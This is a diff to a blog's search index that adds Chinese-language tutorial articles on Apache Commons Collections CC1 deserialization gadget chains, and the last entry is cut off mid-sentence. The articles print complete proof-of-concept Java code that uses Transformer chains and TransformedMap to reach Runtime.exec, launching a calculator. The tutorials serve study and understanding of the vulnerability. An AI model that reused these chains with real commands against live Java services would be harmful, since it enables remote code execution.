@@ -239,6 +239,31 @@
     
     
     <entry>
+      <title>Commons Collections迭代调用链</title>
+      <link href="/article/cc1-basic/"/>
+      <url>/article/cc1-basic/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>参考文章</p><ol><li><a href="https://www.cnblogs.com/chanshuyi/p/head_first_of_reflection.html">大白话说Java反射：入门、使用、原理</a></li><li><a href="https://www.runoob.com/java/java-reflection.html">菜鸟教程-Java反射</a></li><li><a href="https://blog.csdn.net/qq_36869808/article/details/121105988">csdn-反序列化调用链——Commons Collections 迭代调用链</a></li></ol><h1>前置知识</h1><p><strong>反射</strong>: Java在运行时动态获取类信息、操作类属性和方法的能力</p><p>如何获取一个对象:</p><ol><li>获取类的 Class 对象实例</li></ol><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.zhenai.api.Apple&quot;</span>);</span><br></pre></td></tr></table></figure><ol start="2"><li>根据 CLass 对象实例获取 Constructor 对象</li></ol><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Constructor</span> <span class="variable">appleConstructor</span> <span class="operator">=</span> clz.getConstructor();</span><br></pre></td></tr></table></figure><ol start="3"><li>使用 Constructor 对象的 newInstance 方法获取反射类对象</li></ol><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">appleObj</span> <span class="operator">=</span> appleConstructor.newInstance();</span><br></pre></td></tr></table></figure><p>如何调用某一个方法:</p><ol><li>获取方法的 Method 对象</li></ol><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">setPriceMethod</span> <span class="operator">=</span> clz.getMethod(<span class="string">&quot;setPrice&quot;</span>, <span class="type">int</span>.class);</span><br></pre></td></tr></table></figure><ol start="2"><li>利用 invoke 方法调用方法</li></ol><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">setPriceMethod.invoke(appleObj, <span class="number">14</span>);</span><br></pre></td></tr></table></figure><p>特点:</p><ul><li>突破封装性：可访问私有成员（需setAccessible(true)）</li><li>动态性：运行时才确定操作对象（如<code>Class.forName(&quot;java.lang.Runtime&quot;</code>方法)）</li><li>自省能力：可获取类结构（方法、字段、注解等）</li></ul><blockquote><p>反射使攻击者能绕过Java的访问控制，操作<code>Runtime</code>等敏感类。</p></blockquote><table><thead><tr><th>术语</th><th>作用</th><th>漏洞利用中的角色</th></tr></thead><tbody><tr><td>反射</td><td>运行时动态操作类</td><td>突破Java安全机制的基础能力</td></tr><tr><td>反射获取方法</td><td>提取类中的特定方法</td><td>获取敏感方法（如 <code>getRuntime</code>）</td></tr><tr><td>反射调用</td><td>动态执行方法</td><td>触发命令执行（如 <code>exec()</code>)</td></tr></tbody></table><h1>迭代链</h1><h2 id="poc"><a class="header-anchor" href="#poc">¶</a>poc</h2><p>POC如下:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1. 创建Transformer链数组（关键恶意操作序列）</span></span><br><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),  </span><br><span class="line">    <span class="comment">// 固定返回Runtime类的Class对象</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, </span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,  </span><br><span class="line">        <span class="comment">// 方法参数类型</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),  </span><br><span class="line">        <span class="comment">// 获取getRuntime方法</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, </span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,  </span><br><span class="line">        <span class="comment">// 方法参数类型</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),        </span><br><span class="line">        <span class="comment">// 调用getRuntime()获取Runtime实例</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, </span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,                 </span><br><span class="line">        <span class="comment">// 方法参数类型</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;Calc.exe&quot;</span>&#125;)                  </span><br><span class="line">        <span class="comment">// 执行系统命令</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这是手动触发transfrom迭代链的方法</p><ul><li>拿到对应类</li><li>反射获取方法</li><li>执行方法</li><li>触发</li></ul><p>一般来说真实情况会是下面这样</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object object)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="built_in">this</span>.iTransformers.length; ++i)&#123;</span><br><span class="line">        object = <span class="built_in">this</span>.iTransformers[i].transform(object);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看不懂吗, 看不懂就对了</p><blockquote><p>每个 <code>InvokerTransformer</code> 只能执行一个方法调用。要执行复杂操作，需要将多个转换器连接起来</p></blockquote><h2 id="获取目标类"><a class="header-anchor" href="#获取目标类">¶</a>获取目标类</h2><p>我们可以通过<code>ConstantTransformer</code>类中的transform方法来获取类</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Object o=<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class).transform(Object.class); System.out.println(o);</span><br><span class="line"><span class="comment">// class java.lang.Runtime</span></span><br></pre></td></tr></table></figure><p><code>ConstantTransformer</code>实现了<code>Transformer</code>接口，重写了transform, 直接来看重写的内容, 发现可以获取到对应的类</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.iConstant;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="获取目标类方法"><a class="header-anchor" href="#获取目标类方法">¶</a>获取目标类方法</h2><p>获取目标类的方式使用的<code>InvokerTransformer</code>, <code>InvokerTransformer</code>类的主要作用就是利用Java反射机制来创建类实例</p><p><code>Transformer</code>方法是直接调用反射机制来获取到方法的实例</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InvokerTransformer</span> <span class="keyword">implements</span> <span class="title class_">Transformer</span> &#123;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 此处调用反射机制</span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line">            <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(methodName, paramTypes);</span><br><span class="line">            <span class="keyword">return</span> method.invoke(input, args);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(...);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么我们执行exec就要进行连续获取<code>getMethod</code>-&gt;<code>getRuntime</code>-&gt;<code>invoke</code>-&gt;<code>exec</code></p><p>那么获取执行方法实例的poc就是</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取Runtime类, o是java.lang.Runtime的Class对象</span></span><br><span class="line">Object o=<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class).transform(Object.class);</span><br><span class="line"><span class="comment">// 获取getRuntime方法, a是getRuntime方法的Method对象</span></span><br><span class="line">Object a=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;).transform(o);</span><br><span class="line"><span class="comment">// 调用getRuntime方法, b是Runtime单例实例</span></span><br><span class="line">Object b=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;).transform(a);</span><br><span class="line"><span class="comment">// 执行exec命令</span></span><br><span class="line">Object c=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;Calc.exe&quot;</span>&#125;).transform(b);</span><br></pre></td></tr></table></figure><h2 id="迭代调用"><a class="header-anchor" href="#迭代调用">¶</a>迭代调用</h2><p>那么直接调用的方式是我们需要手动的去调用他们的transform方法, 肯定无法在实战中使用, 我们需要找到一个可以进行迭代调用的方式</p><p>庆幸的是存在一个<code>ChainedTransformer</code>类, 该类实现了<code>Transformer</code>链式调用; 我们只需要传入一个<code>Transformer</code>数组<code>ChainedTransformer</code>就可以实现依次的去调用每一个<code>Transformer</code>的transform方法</p><p>那么我们通过<code>ChainedTransformer</code>类调用：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;Calc.exe&quot;</span>&#125;),</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">transformerChain.transform(Object.class);</span><br></pre></td></tr></table></figure><p>那么这样就可以直接触发整个transformers数组的Transform方法。 面临的问题就是如何去触发<code>ChainedTransformer</code>的Transform方法。那么这个就是之后整个反序列链的基础链</p><h1>总结</h1><p>所以核心就是下面这三个</p><ul><li><code>ConstantTransformer</code>获取类</li><li><code>InvokerTransformer</code>反射方法</li><li><code>ChainedTransformer</code>迭代调用</li></ul><h1>完整代码</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">testCC1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;Calc.exe&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        transformerChain.transform(Object.class);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> 代码审计 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Java </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Java反序列化</title>
       <link href="/article/java-unser/"/>
       <url>/article/java-unser/</url>
@@ -258,6 +283,56 @@
             <tag> Java </tag>
             
             <tag> 反序列化 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>TransformedMap调用链</title>
+      <link href="/article/cc1-transformedmap/"/>
+      <url>/article/cc1-transformedmap/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>结合<a href="CC%E8%BF%AD%E4%BB%A3%E8%B0%83%E7%94%A8%E9%93%BE.md">CC迭代调用链</a>,我们可以知道想进行RCE的核心是<code>ChainedTransformer</code>的Transformer方法, 本文中<code>TransformedMap</code>就是可以调用此方法的一条链</p><h1>CC1 TransformedMap链</h1><p>CC包中的TransformedMap类在进行put, checkSetValue等方法时, 可以触发transform方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">protect Object <span class="title function_">checkSetValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.valueTransformer.transform(value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">put</span><span class="params">(Object key, Object value)</span> &#123;</span><br><span class="line">    key = <span class="built_in">this</span>.transformKey(key);</span><br><span class="line">    value = <span class="built_in">this</span>.transformValue(value);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.getMap().put(key, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="POC"><a class="header-anchor" href="#POC">¶</a>POC</h2><p>明显就是利用<code>TransformedMap</code>去触发迭代调用链, 先使用decorate进行赋值，然后使用put进行触发</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 构建Transformer执行链</span></span><br><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class,Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Object.class,Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">String</span>[] &#123;<span class="string">&quot;Calc.exe&quot;</span>&#125;),</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将Transformer链封装为ChainedTransformer</span></span><br><span class="line"><span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span></span><br><span class="line">        <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"><span class="comment">// 创建原始Map并装饰为TransformedMap</span></span><br><span class="line"><span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>, transformerChain);</span><br><span class="line"><span class="comment">// 触发执行链</span></span><br><span class="line">outerMap.put(<span class="string">&quot;zeo&quot;</span>, <span class="string">&quot;666&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="解析"><a class="header-anchor" href="#解析">¶</a>解析</h2><p>这是<code>TransformedMap.decorate()</code> - 装饰器模式, 会创建一个特殊的TransformedMap, 此时这个<code>valueTransformer</code>是我们构造的transformerChain</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当调用<code>outerMap.put(&quot;zeo&quot;, &quot;666&quot;);</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">put</span><span class="params">(Object key, Object value)</span> &#123;</span><br><span class="line">    <span class="comment">// 关键：对value进行转换</span></span><br><span class="line">    value = transformValue(value);</span><br><span class="line">    <span class="keyword">return</span> getMap().put(key, value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> Object <span class="title function_">transformValue</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (valueTransformer == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 这里触发transformerChain.transform(&quot;666&quot;)</span></span><br><span class="line">    <span class="keyword">return</span> valueTransformer.transform(object);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1>完整代码</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">testCC1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="comment">// 构建Transformer执行链</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class,Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Object.class,Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">String</span>[] &#123;<span class="string">&quot;Calc.exe&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将Transformer链封装为ChainedTransformer</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span></span><br><span class="line">                <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">    <span class="comment">// 创建原始Map并装饰为TransformedMap</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>, transformerChain);</span><br><span class="line">    <span class="comment">// 触发执行链</span></span><br><span class="line">        outerMap.put(<span class="string">&quot;zeo&quot;</span>, <span class="string">&quot;666&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> 代码审计 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Java </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Commons-Collection链</title>
+      <link href="/article/cc-chain/"/>
+      <url>/article/cc-chain/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>参考文章</p><ol><li><a href="https://blog.csdn.net/qq_36869808/article/details/129539246">csdn-CC链总结</a></li><li><a href="https://www.cnblogs.com/1vxyz/p/17284838.html">博客园-Java反序列化Commons-Collection篇01-CC1链</a></li><li><a href="https://www.freebuf.com/articles/web/390210.html">freebuf-Java安全 CC链1分析</a></li><li><a href="https://geekdaxue.co/read/maxsecurity@mbxigk/yztya9">个人博客-Java Web学习</a></li><li><a href="https://xz.aliyun.com/news/9835">先知社区-通俗易懂的Java Commons Collection 2分析</a></li><li><a href="https://www.cnblogs.com/1vxyz/category/2260818.html">博客园-1vxyz-随笔分类-Java安全</a></li></ol><h1>介绍</h1><p>Apache Commons Collections 是一个为 Java 提供扩展集合类的开源项目, 它提供了一系列有用的集合类和算法, 可以使编程变得更加简单, 快捷和高效</p><p>CC链（Commons Collections反序列化漏洞利用链）是Java安全领域中最具代表性的反序列化攻击技术之一, 其核心通过恶意构造的序列化对象触发Apache Commons Collections库中的反射机制, 最终实现任意代码执行</p><h1>环境准备</h1><p>JDK版本：CC1、CC3、CC5、CC6、CC7 建议使用JDK 8u65或更低版本JDK 8u71后修复了AnnotationInvocationHandler的触发逻辑</p><p>Commons Collections版本：CC1-CC3、CC5-CC7 使用 3.2.1；CC2、CC4 使用 4.0注意：3.2.2/4.1版本增加了安全限制，但若启用不安全序列化属性仍可能存在风险</p><p>工具：推荐使用<a href="../../../../../%E5%B7%A5%E5%85%B7/Web/ysoserial.md">ysoserial</a>生成Payload进行测试</p><p>CC1可以看<a href="https://www.freebuf.com/articles/web/390210.html">Java安全 CC链1分析</a>的第一部分来配置IDEA和java 8u66(我用这个版本进行复现)</p><p>CC2可以看<a href="https://xz.aliyun.com/news/9835">先知社区-通俗易懂的Java Commons Collection 2分析</a>配置IDEA环境</p><h1>前置知识</h1><ul><li><a href="../../Java%E4%BB%A3%E7%90%86.md">Java代理</a></li><li><a href="../../Java%E5%9F%BA%E7%A1%80.md">Java基础</a></li><li><a href="../../Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.md">Java反序列化</a></li><li>Apache Commons Collections库中的常用API(写在对应文章里面得了)</li></ul><h1>CC链</h1><p>流程图总览<a href="CC%E5%88%A9%E7%94%A8%E9%93%BE.excalidraw.md">CC利用链.excalidraw</a></p><h2 id="CC1-TransformedMap"><a class="header-anchor" href="#CC1-TransformedMap">¶</a>CC1 TransformedMap</h2><p>入口: <code>AnnotationInvocationHandler#readObject</code>核心组件: <code>TransformedMap</code>条件: jdk 1.7限制</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">  AnnotationInvocationHandler.readObject()</span><br><span class="line">    memberValues.entrySet().iterator().next().setValue()</span><br><span class="line">      TransformedMap.checkSetValue()</span><br><span class="line">        ChainedTransformer.transform()</span><br><span class="line">          ConstantTransformer.transform() [获取Runtime类]</span><br><span class="line">          InvokerTransformer.transform() [反射获取getRuntime方法]</span><br><span class="line">          InvokerTransformer.transform() [反射调用getRuntime方法]</span><br><span class="line">          InvokerTransformer.transform() [反射调用exec方法执行命令]</span><br></pre></td></tr></table></figure><ul><li><a href="CC%E8%BF%AD%E4%BB%A3%E8%B0%83%E7%94%A8%E9%93%BE.md">CC迭代调用链</a></li><li><a href="TransformedMap%E8%B0%83%E7%94%A8%E9%93%BE.md">TransformedMap调用链</a></li><li><a href="AnnotationInvocationHandler-readObject%E8%B0%83%E7%94%A8%E9%93%BE.md">AnnotationInvocationHandler-readObject调用链</a></li></ul><h2 id="CC1-LazyMap"><a class="header-anchor" href="#CC1-LazyMap">¶</a>CC1 LazyMap</h2><p>入口: <code>AnnotationInvocationHandler#readObject</code>核心组件: <code>LazyMap</code>条件: jdk 1.7限制</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">  AnnotationInvocationHandler.readObject()</span><br><span class="line">    